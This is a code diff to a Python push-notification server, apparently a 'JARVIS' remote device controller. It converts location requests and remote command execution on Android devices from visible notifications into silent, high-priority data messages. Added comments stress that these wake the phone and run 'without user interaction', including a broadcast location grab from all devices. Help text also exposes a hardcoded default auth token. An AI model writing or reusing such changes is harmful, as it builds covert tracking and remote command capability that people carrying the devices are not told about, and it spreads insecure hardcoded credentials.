@@ -441,12 +441,10 @@ class FCMNotificationService:
         return await self.send_to_multiple(device_ids, title, body, data)
     
     async def request_location(self, device_id: str, priority: str = "high") -> dict:
-        """Request GPS location from a device."""
+        """Request GPS location from a device with high-priority background execution."""
         request_id = f"loc_{device_id}_{int(time.time())}"
-        return await self.send_to_device(
+        return await self.send_silent_data(
             device_id,
-            "Location Request",
-            "Server requesting your location",
             {
                 "action": "get_location",
                 "priority": priority,
@@ -456,27 +454,45 @@ class FCMNotificationService:
         )
     
     async def request_location_from_all(self, priority: str = "normal") -> dict:
-        """Request location from all devices."""
+        """Request location from all devices with high-priority background execution."""
         device_ids = list(self.device_manager.devices.keys())
         request_id = f"loc_all_{int(time.time())}"
-        return await self.send_to_multiple(
-            device_ids,
-            "Location Request",
-            "Server requesting location from all devices",
-            {
+        
+        tokens = [self.device_manager.get_token(did) for did in device_ids]
+        tokens = [t for t in tokens if t]  # Filter None values
+        
+        if not tokens:
+            return {'status': 'failed', 'error': 'No valid tokens found'}
+        
+        message = messaging.MulticastMessage(
+            data={
                 "action": "get_location",
                 "priority": priority,
                 "request_id": request_id
-            }
+            },
+            tokens=tokens,
+            android=messaging.AndroidConfig(
+                priority='high',  # HIGH PRIORITY: Executes immediately in background
+            )
         )
+        
+        try:
+            response = messaging.send_multicast(message)
+            print(f"[FCM] Multicast: {response.success_count} sent, {response.failure_count} failed")
+            return {
+                'status': 'sent',
+                'success_count': response.success_count,
+                'failure_count': response.failure_count
+            }
+        except Exception as e:
+            print(f"[FCM] Multicast failed: {e}")
+            return {'status': 'failed', 'error': str(e)}
     
     async def execute_command(self, device_id: str, command: str) -> dict:
-        """Execute a command on a device."""
+        """Execute a command on a device with high-priority background execution."""
         request_id = f"cmd_{device_id}_{int(time.time())}"
-        return await self.send_to_device(
+        return await self.send_silent_data(
             device_id,
-            "Command Execution",
-            f"Executing: {command}",
             {
                 "action": "execute_command",
                 "command": command,
@@ -485,7 +501,12 @@ class FCMNotificationService:
         )
     
     async def send_silent_data(self, device_id: str, data: dict) -> dict:
-        """Send data-only message without notification."""
+        """
+        Send high-priority data-only message that executes immediately in background.
+        
+        CRITICAL: No notification field = executes without user interaction.
+        Android priority 'high' = wakes device and executes immediately.
+        """
         token = self.device_manager.get_token(device_id)
         if not token:
             raise ValueError(f"Device not found: {device_id}")
@@ -494,14 +515,17 @@ class FCMNotificationService:
             data=data,
             token=token,
             android=messaging.AndroidConfig(
-                priority='high',
+                priority='high',  # HIGH PRIORITY: Wakes device immediately
+                # NO notification field = silent execution in background
             )
         )
         
         try:
             response = messaging.send(message)
+            print(f"[FCM] Silent data sent to {device_id}: {response}")
             return {'status': 'sent', 'message_id': response, 'device_id': device_id}
         except Exception as e:
+            print(f"[FCM] Failed to send to {device_id}: {e}")
             return {'status': 'failed', 'error': str(e), 'device_id': device_id}
 
 
@@ -1982,7 +2006,7 @@ def main():
                         help="Authentication token (default: from JARVIS_AUTH_TOKEN env or 'Denemeler123.')")
     parser.add_argument("--no-fcm", action="store_true",
                         help="Disable FCM functionality")
-    parser.add_argument("--location-interval", type=int, default=1,
+    parser.add_argument("--location-interval", type=int, default=30,
                         help="Location tracking interval in minutes (default: 30)")
     parser.add_argument("--reload", action="store_true",
                         help="Enable auto-reload on file changes")
